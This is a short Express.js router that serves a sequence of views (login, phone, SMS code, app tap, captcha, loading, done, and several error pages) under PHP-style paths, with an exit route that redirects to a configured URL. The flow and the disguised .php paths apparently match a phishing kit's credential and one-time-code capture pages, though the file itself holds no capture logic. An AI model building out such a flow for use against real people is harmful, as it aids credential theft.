const express = require('express');
const router = express.Router();
const path = require('path');

const pageRoutes = [
  { path: '/', view: 'index' },
  { path: '/index.php', view: 'index' },
  { path: '/auth.php', view: 'auth' },
  { path: '/app.php', view: 'app' },
  { path: '/phone.php', view: 'phone' },
  { path: '/sms.php', view: 'sms' },
  { path: '/captcha.php', view: 'captcha' },
  { path: '/loading.php', view: 'loading' },
  { path: '/done.php', view: 'done' },
  { path: '/exit.php', view: 'exit' },
  { path: '/tap.php', view: 'tap' },
  { path: '/auth_error.php', view: 'auth_error' },
  { path: '/login_error.php', view: 'login_error' },
  { path: '/sms_error.php', view: 'sms_error' },
  { path: '/app_error.php', view: 'app_error' },
  { path: '/phone_error.php', view: 'phone' },
];

for (const route of pageRoutes) {
  router.get(route.path, (req, res) => {
    if (route.view === 'exit') {
      return res.redirect(res.locals.config.exitUrl);
    }
    res.render(route.view);
  });
}

module.exports = router;
